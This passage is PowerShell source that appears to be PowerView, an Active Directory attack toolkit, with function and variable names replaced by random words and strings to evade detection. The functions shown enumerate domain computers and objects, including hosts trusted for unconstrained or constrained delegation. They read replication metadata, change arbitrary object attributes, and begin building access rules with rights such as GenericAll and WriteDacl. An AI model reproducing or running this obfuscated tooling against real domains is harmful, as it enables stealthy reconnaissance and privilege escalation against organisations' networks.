        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        $UYjsUTbz99 = foaling @SearcherArguments
    }

    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            prostrates -rgjbmZdj99 -bKctLDxk99 $PSBoundParameters
        }

        if ($UYjsUTbz99) {
            $zdhlwIap99 = ''
            $cqPynTGG99 = ''
            $aCzrnrLk99 | Where-Object {$_} | ForEach-Object {
                $JmddWUUS99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($JmddWUUS99 -match '^S-1-') {
                    $zdhlwIap99 += "(objectsid=$JmddWUUS99)"
                }
                elseif ($JmddWUUS99 -match '^CN=') {
                    $zdhlwIap99 += "(distinguishedname=$JmddWUUS99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $MuprcxcZ99 = $JmddWUUS99.SubString($JmddWUUS99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Rankine] Extracted domain '$MuprcxcZ99' from '$JmddWUUS99'"
                        $xfOIjAld99['Domain'] = $MuprcxcZ99
                        $UYjsUTbz99 = foaling @SearcherArguments
                        if (-not $UYjsUTbz99) {
                            Write-Warning "[Rankine] Unable to retrieve domain searcher for '$MuprcxcZ99'"
                        }
                    }
                }
                elseif ($JmddWUUS99.Contains('.')) {
                    $zdhlwIap99 += "(|(name=$JmddWUUS99)(dnshostname=$JmddWUUS99))"
                }
                elseif ($JmddWUUS99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $osroZIBb99 = (([Guid]$JmddWUUS99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $zdhlwIap99 += "(objectguid=$osroZIBb99)"
                }
                else {
                    $zdhlwIap99 += "(name=$JmddWUUS99)"
                }
            }
            if ($zdhlwIap99 -and ($zdhlwIap99.Trim() -ne '') ) {
                $cqPynTGG99 += "(|$zdhlwIap99)"
            }

            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[Rankine] Searching for computers with for unconstrained delegation'
                $cqPynTGG99 += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Rankine] Searching for computers that are trusted to authenticate for other principals'
                $cqPynTGG99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[Rankine] Searching for printers'
                $cqPynTGG99 += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[Rankine] Searching for computers with SPN: $SPN"
                $cqPynTGG99 += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[Rankine] Searching for computers with operating system: $DfPrQYoc99"
                $cqPynTGG99 += "(operatingsystem=$DfPrQYoc99)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[Rankine] Searching for computers with service pack: $kKsiFEfu99"
                $cqPynTGG99 += "(operatingsystemservicepack=$kKsiFEfu99)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[Rankine] Searching for computers with site name: $ZBmuuCEe99"
                $cqPynTGG99 += "(serverreferencebl=$ZBmuuCEe99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Rankine] Using additional LDAP filter: $RUtJqxpA99"
                $cqPynTGG99 += "$RUtJqxpA99"
            }
            $DjNQYgqY99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $zWlRLVUz99 = $_.Substring(4)
                    $IfcDPFUO99 = [Int]($CaGOukxX99::$zWlRLVUz99)
                    $cqPynTGG99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$IfcDPFUO99))"
                }
                else {
                    $IfcDPFUO99 = [Int]($CaGOukxX99::$_)
                    $cqPynTGG99 += "(userAccountControl:1.2.840.113556.1.4.803:=$IfcDPFUO99)"
                }
            }

            $UYjsUTbz99.filter = "(&(samAccountType=805306369)$cqPynTGG99)"
            Write-Verbose "[Rankine] Rankine filter string: $($UYjsUTbz99.filter)"

            if ($PSBoundParameters['FindOne']) { $vDOGrGBR99 = $UYjsUTbz99.FindOne() }
            else { $vDOGrGBR99 = $UYjsUTbz99.FindAll() }
            $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -wkNUqpQt99 $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        $LqojfQUN99 = $_
                        $LqojfQUN99.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $LqojfQUN99 = meridian -kaLEgole99 $_.Properties
                        $LqojfQUN99.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $LqojfQUN99
                }
            }
            if ($vDOGrGBR99) {
                try { $vDOGrGBR99.dispose() }
                catch {
                    Write-Verbose "[Rankine] Error disposing of the Results object: $_"
                }
            }
            $UYjsUTbz99.dispose()
        }
    }
}


function grow {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $aCzrnrLk99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $iKRjUkvW99,

        [Switch]
        $uomKXjrL99,

        [Alias('ReturnOne')]
        [Switch]
        $iRGTotKK99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $evFJPxJs99 = [Enum]::GetNames($CaGOukxX99)
        $evFJPxJs99 = $evFJPxJs99 | ForEach-Object {$_; "NOT_$_"}
        prostrates -Name UACFilter -TVGxsQnM99 $evFJPxJs99 -Type ([array])
    }

    BEGIN {
        $xfOIjAld99 = @{}
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Properties']) { $xfOIjAld99['Properties'] = $kaLEgole99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['SecurityMasks']) { $xfOIjAld99['SecurityMasks'] = $iKRjUkvW99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
        $xcWgOtoh99 = foaling @SearcherArguments
    }

    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            prostrates -rgjbmZdj99 -bKctLDxk99 $PSBoundParameters
        }
        if ($xcWgOtoh99) {
            $zdhlwIap99 = ''
            $cqPynTGG99 = ''
            $aCzrnrLk99 | Where-Object {$_} | ForEach-Object {
                $JmddWUUS99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($JmddWUUS99 -match '^S-1-') {
                    $zdhlwIap99 += "(objectsid=$JmddWUUS99)"
                }
                elseif ($JmddWUUS99 -match '^(CN|OU|DC)=') {
                    $zdhlwIap99 += "(distinguishedname=$JmddWUUS99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $MuprcxcZ99 = $JmddWUUS99.SubString($JmddWUUS99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[grow] Extracted domain '$MuprcxcZ99' from '$JmddWUUS99'"
                        $xfOIjAld99['Domain'] = $MuprcxcZ99
                        $xcWgOtoh99 = foaling @SearcherArguments
                        if (-not $xcWgOtoh99) {
                            Write-Warning "[grow] Unable to retrieve domain searcher for '$MuprcxcZ99'"
                        }
                    }
                }
                elseif ($JmddWUUS99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $osroZIBb99 = (([Guid]$JmddWUUS99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $zdhlwIap99 += "(objectguid=$osroZIBb99)"
                }
                elseif ($JmddWUUS99.Contains('\')) {
                    $jiHKRwfa99 = $JmddWUUS99.Replace('\28', '(').Replace('\29', ')') | jiggering -hKoxCyte99 Canonical
                    if ($jiHKRwfa99) {
                        $irLssfCx99 = $jiHKRwfa99.SubString(0, $jiHKRwfa99.IndexOf('/'))
                        $prIHNbyB99 = $JmddWUUS99.Split('\')[1]
                        $zdhlwIap99 += "(samAccountName=$prIHNbyB99)"
                        $xfOIjAld99['Domain'] = $irLssfCx99
                        Write-Verbose "[grow] Extracted domain '$irLssfCx99' from '$JmddWUUS99'"
                        $xcWgOtoh99 = foaling @SearcherArguments
                    }
                }
                elseif ($JmddWUUS99.Contains('.')) {
                    $zdhlwIap99 += "(|(samAccountName=$JmddWUUS99)(name=$JmddWUUS99)(dnshostname=$JmddWUUS99))"
                }
                else {
                    $zdhlwIap99 += "(|(samAccountName=$JmddWUUS99)(name=$JmddWUUS99)(displayname=$JmddWUUS99))"
                }
            }
            if ($zdhlwIap99 -and ($zdhlwIap99.Trim() -ne '') ) {
                $cqPynTGG99 += "(|$zdhlwIap99)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[grow] Using additional LDAP filter: $RUtJqxpA99"
                $cqPynTGG99 += "$RUtJqxpA99"
            }

            $DjNQYgqY99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $zWlRLVUz99 = $_.Substring(4)
                    $IfcDPFUO99 = [Int]($CaGOukxX99::$zWlRLVUz99)
                    $cqPynTGG99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$IfcDPFUO99))"
                }
                else {
                    $IfcDPFUO99 = [Int]($CaGOukxX99::$_)
                    $cqPynTGG99 += "(userAccountControl:1.2.840.113556.1.4.803:=$IfcDPFUO99)"
                }
            }

            if ($cqPynTGG99 -and $cqPynTGG99 -ne '') {
                $xcWgOtoh99.filter = "(&$cqPynTGG99)"
            }
            Write-Verbose "[grow] grow filter string: $($xcWgOtoh99.filter)"

            if ($PSBoundParameters['FindOne']) { $vDOGrGBR99 = $xcWgOtoh99.FindOne() }
            else { $vDOGrGBR99 = $xcWgOtoh99.FindAll() }
            $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = meridian -kaLEgole99 $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($vDOGrGBR99) {
                try { $vDOGrGBR99.dispose() }
                catch {
                    Write-Verbose "[grow] Error disposing of the Results object: $_"
                }
            }
            $xcWgOtoh99.dispose()
        }
    }
}


function Brunswick {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $aCzrnrLk99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $xfOIjAld99 = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['LDAPFilter']) { $xfOIjAld99['LDAPFilter'] = $RUtJqxpA99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['FindOne']) { $xfOIjAld99['FindOne'] = $iRGTotKK99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }

        if ($PSBoundParameters['Properties']) {
            $kDNLgRoY99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $kDNLgRoY99 = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $xfOIjAld99['Identity'] = $aCzrnrLk99 }

        grow @SearcherArguments | ForEach-Object {
            $CGiGIpkb99 = $_.Properties['distinguishedname'][0]
            ForEach($DFCPZpue99 in $_.Properties['msds-replattributemetadata']) {
                $ruLMOHpr99 = [xml]$DFCPZpue99 | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($ruLMOHpr99) {
                    if ($ruLMOHpr99.pszAttributeName -Match $kDNLgRoY99) {
                        $BjYCzrxj99 = New-Object PSObject
                        $BjYCzrxj99 | Add-Member NoteProperty 'ObjectDN' $CGiGIpkb99
                        $BjYCzrxj99 | Add-Member NoteProperty 'AttributeName' $ruLMOHpr99.pszAttributeName
                        $BjYCzrxj99 | Add-Member NoteProperty 'LastOriginatingChange' $ruLMOHpr99.ftimeLastOriginatingChange
                        $BjYCzrxj99 | Add-Member NoteProperty 'Version' $ruLMOHpr99.dwVersion
                        $BjYCzrxj99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $ruLMOHpr99.pszLastOriginatingDsaDN
                        $BjYCzrxj99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $BjYCzrxj99
                    }
                }
                else {
                    Write-Verbose "[Brunswick] Error retrieving 'msds-replattributemetadata' for '$CGiGIpkb99'"
                }
            }
        }
    }
}


function steeling {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $aCzrnrLk99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $kaLEgole99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $xfOIjAld99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['LDAPFilter']) { $xfOIjAld99['LDAPFilter'] = $RUtJqxpA99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }

        if ($PSBoundParameters['Properties']) {
            $kDNLgRoY99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $kDNLgRoY99 = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $xfOIjAld99['Identity'] = $aCzrnrLk99 }

        grow @SearcherArguments | ForEach-Object {
            $CGiGIpkb99 = $_.Properties['distinguishedname'][0]
            ForEach($DFCPZpue99 in $_.Properties['msds-replvaluemetadata']) {
                $ruLMOHpr99 = [xml]$DFCPZpue99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($ruLMOHpr99) {
                    if ($ruLMOHpr99.pszAttributeName -Match $kDNLgRoY99) {
                        $BjYCzrxj99 = New-Object PSObject
                        $BjYCzrxj99 | Add-Member NoteProperty 'ObjectDN' $CGiGIpkb99
                        $BjYCzrxj99 | Add-Member NoteProperty 'AttributeName' $ruLMOHpr99.pszAttributeName
                        $BjYCzrxj99 | Add-Member NoteProperty 'AttributeValue' $ruLMOHpr99.pszObjectDn
                        $BjYCzrxj99 | Add-Member NoteProperty 'TimeCreated' $ruLMOHpr99.ftimeCreated
                        $BjYCzrxj99 | Add-Member NoteProperty 'TimeDeleted' $ruLMOHpr99.ftimeDeleted
                        $BjYCzrxj99 | Add-Member NoteProperty 'LastOriginatingChange' $ruLMOHpr99.ftimeLastOriginatingChange
                        $BjYCzrxj99 | Add-Member NoteProperty 'Version' $ruLMOHpr99.dwVersion
                        $BjYCzrxj99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $ruLMOHpr99.pszLastOriginatingDsaDN
                        $BjYCzrxj99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $BjYCzrxj99
                    }
                }
                else {
                    Write-Verbose "[steeling] Error retrieving 'msds-replvaluemetadata' for '$CGiGIpkb99'"
                }
            }
        }
    }
}


function moneybags {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $aCzrnrLk99,

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $xfOIjAld99 = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['LDAPFilter']) { $xfOIjAld99['LDAPFilter'] = $RUtJqxpA99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $xfOIjAld99['Identity'] = $aCzrnrLk99 }

        $mwCjDkwu99 = grow @SearcherArguments

        ForEach ($Object in $mwCjDkwu99) {

            $Entry = $mwCjDkwu99.GetDirectoryEntry()

            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[moneybags] Setting '$($_.Name)' to '$($_.Value)' for object '$($mwCjDkwu99.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[moneybags] Error setting/replacing properties for object '$($mwCjDkwu99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $NNyaOtXx99 = $_.Name
                        $VPMJYzVN99 = $_.Value
                        Write-Verbose "[moneybags] XORing '$NNyaOtXx99' with '$VPMJYzVN99' for object '$($mwCjDkwu99.Properties.samaccountname)'"
                        $rIWEOkty99 = $Entry.$NNyaOtXx99[0].GetType().name

                        $VntjfPLZ99 = $($Entry.$NNyaOtXx99) -bxor $VPMJYzVN99
                        $Entry.$NNyaOtXx99 = $VntjfPLZ99 -as $rIWEOkty99
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[moneybags] Error XOR'ing properties for object '$($mwCjDkwu99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $NNyaOtXx99 = $_
                        Write-Verbose "[moneybags] Clearing '$NNyaOtXx99' for object '$($mwCjDkwu99.Properties.samaccountname)'"
                        $Entry.$NNyaOtXx99.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[moneybags] Error clearing properties for object '$($mwCjDkwu99.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}


function Indonesian {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $gHqCRGpV99
    )

    Begin {
        if($gHqCRGpV99.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }

        function worshiper {
            Param (
                [int[]]
                $qahoUQTd99
            )

            $GMEFnLFI99 = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $qahoUQTd99[$i]
                $edhaIdNu99 = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')

                $GMEFnLFI99[$edhaIdNu99+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $GMEFnLFI99[$edhaIdNu99+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $GMEFnLFI99[$edhaIdNu99+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $GMEFnLFI99[$edhaIdNu99+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $GMEFnLFI99[$edhaIdNu99+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $GMEFnLFI99[$edhaIdNu99+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $GMEFnLFI99[$edhaIdNu99+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $GMEFnLFI99[$edhaIdNu99+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }

            $GMEFnLFI99
        }
    }

    Process {
        $BjYCzrxj99 = @{
            Sunday = worshiper -qahoUQTd99 $gHqCRGpV99[0..2]
            Monday = worshiper -qahoUQTd99 $gHqCRGpV99[3..5]
            Tuesday = worshiper -qahoUQTd99 $gHqCRGpV99[6..8]
            Wednesday = worshiper -qahoUQTd99 $gHqCRGpV99[9..11]
            Thurs = worshiper -qahoUQTd99 $gHqCRGpV99[12..14]
            Friday = worshiper -qahoUQTd99 $gHqCRGpV99[15..17]
            Saturday = worshiper -qahoUQTd99 $gHqCRGpV99[18..20]
        }

        $BjYCzrxj99 = New-Object PSObject -Property $BjYCzrxj99
        $BjYCzrxj99.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $BjYCzrxj99
    }
}


function trapezoid {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $osehckuv99,

        [ValidateNotNullOrEmpty()]
        [String]
        $OyUhlxiF99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,

        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $PgtyTFWs99,

        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $DmfLSijM99,

        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $yEQFtmfD99,

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $KDNTGmOE99,

        [Guid]
        $CZaUEGxt99
    )

    Begin {
